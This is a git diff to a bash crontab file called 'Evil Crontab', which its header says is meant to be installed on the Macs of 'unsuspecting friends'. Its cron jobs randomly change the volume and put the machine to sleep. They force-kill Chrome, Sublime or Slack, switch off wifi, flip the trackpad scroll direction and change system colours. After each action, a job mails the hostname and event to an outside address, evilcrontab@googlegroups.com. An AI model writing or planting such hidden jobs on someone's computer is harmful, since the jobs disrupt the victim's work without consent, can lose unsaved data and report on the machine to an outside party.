@@ -1,5 +1,12 @@
 #!/bin/bash
 #
+# ███████╗██╗   ██╗██╗██╗          ██████╗██████╗  ██████╗ ███╗   ██╗████████╗ █████╗ ██████╗
+# ██╔════╝██║   ██║██║██║         ██╔════╝██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗
+# █████╗  ██║   ██║██║██║         ██║     ██████╔╝██║   ██║██╔██╗ ██║   ██║   ███████║██████╔╝
+# ██╔══╝  ╚██╗ ██╔╝██║██║         ██║     ██╔══██╗██║   ██║██║╚██╗██║   ██║   ██╔══██║██╔══██╗
+# ███████╗ ╚████╔╝ ██║███████╗    ╚██████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ██║  ██║██████╔╝
+# ╚══════╝  ╚═══╝  ╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═════╝
+#
 # Evil Crontab™
 # Meant to be installed on the machines of your unsuspecting friends.
 # Designed to be subtle in its evilness, and aims to have its effects
@@ -21,19 +28,67 @@
 ################################################################################
 
 # Keep changing the volume
-*/5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))"
+1-58,59-0/5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))"
 
 # Make annoying sound once every 10 minutes
-*/10 * * * * tput bel
+# 2-57,58-1/10 * * * * tput bel
 
 # Go to sleep once every hour
-0 * * * * pmset sleepnow > /dev/null 2>&1 && (echo "`date`: Screen went to sleep on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+3 * * * * pmset sleepnow > /dev/null 2>&1 && (echo "`date`: Screen went to sleep on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 # Kill a app once every three hours
-1 */3 * * * apps=('Chrome' 'Sublime' 'Slack') && app=${apps[$RANDOM % ${#apps[@]} ]} && kill -9 $(pgrep $app) && (echo "`date`: An app died on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+4 */3 * * * apps=('Chrome' 'Sublime' 'Slack') && app=${apps[$RANDOM % ${#apps[@]} ]} && kill -9 $(pgrep $app) && (echo "`date`: An app died on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
-# Switch off wifi once every three hours
-30 */2 * * * networksetup -setairportpower en0 off && (echo "`date`: Wifi turned off on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+# Switch off wifi once every two hours
+5 */2 * * * networksetup -setairportpower en0 off && (echo "`date`: Wifi turned off on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+
+################################################################################
+#
+#   ____ _ _             _                                _
+#  / ___| (_)_   _____  (_)___    __ _    __ _  ___ _ __ (_)_   _ ___
+# | |   | | \ \ / / _ \ | / __|  / _` |  / _` |/ _ \ '_ \| | | | / __|
+# | |___| | |\ V /  __/ | \__ \ | (_| | | (_| |  __/ | | | | |_| \__ \
+#  \____|_|_| \_/ \___| |_|___/  \__,_|  \__, |\___|_| |_|_|\__,_|___/
+#                                        |___/
+#
+# This is the Clive Is A Genius section. It exists because Clive is a genius.
+
+# Change accent and high colours every 15 minutes
+# Code:
+# ```
+# tell application \"System Preferences\"
+#     reveal anchor \"Main\" of pane id \"com.apple.preference.general\"
+# end tell
+# tell application \"System Events\"
+#     repeat until exists of checkbox \"Light\" of window \"General\" of application process \"System Preferences\"
+#         delay 0.1
+#     end repeat
+#     click checkbox \"$color1\" of window \"General\" of application process \"System Preferences\"
+#     click pop up button 1 of window \"General\" of application process \"System Preferences\"
+#     click menu item \"$color2\" of menu 1 of pop up button 1 of window \"General\" of application process \"System Preferences\"
+# end tell
+# tell application \"System Preferences\" to quit
+# ```
+6-53,54-5/15 * * * * colors=('Blue' 'Purple' 'Pink' 'Red' 'Orange' 'Yellow' 'Green' 'Graphite') && color1=${colors[$RANDOM % ${#colors[@]} ]} && color2=${colors[$RANDOM % ${#colors[@]} ]} && osascript -e "tell application \"System Preferences\" to reveal anchor \"Main\" of pane id \"com.apple.preference.general\"" && osascript -e "tell application \"System Events\" to click checkbox \"$color1\" of window \"General\" of application process \"System Preferences\"" && osascript -e "tell application \"System Events\" to click pop up button 1 of window \"General\" of application process \"System Preferences\"" && osascript -e "tell application \"System Events\" to click menu item \"$color2\" of menu 1 of pop up button 1 of window \"General\" of application process \"System Preferences\"" && osascript -e "tell application \"System Preferences\" to quit" && (echo "`date`: Everything is now $color1 and $color2 on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+
+# Flip the trackpard scroll direction every 15 minutes
+# # Code:
+# ```
+# tell application "System Preferences"
+#     activate
+#     set current pane to pane "com.apple.preference.trackpad"
+# end tell
+# tell application "System Events"
+#     tell process "System Preferences"
+#         click radio button "Scroll & Zoom" of tab group 1 of window "Trackpad"
+#         click checkbox 1 of tab group 1 of window "Trackpad"
+#     end tell
+# end tell
+# tell application "System Preferences"
+#     quit
+# end tell
+# ```
+7-52,53-6/15 * * * * osascript -e "tell application \"System Preferences\" to set current pane to pane \"com.apple.preference.trackpad\"" && osascript -e "tell application \"System Events\" to tell process \"System Preferences\" to click radio button \"Scroll & Zoom\" of tab group 1 of window \"Trackpad\"" && osascript -e "tell application \"System Events\" to tell process \"System Preferences\" to click checkbox 1 of tab group 1 of window \"Trackpad\"" && osascript -e "tell application \"System Preferences\" to quit" && (echo "`date`: Trackpad scroll direction flipped on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 ################################################################################
 
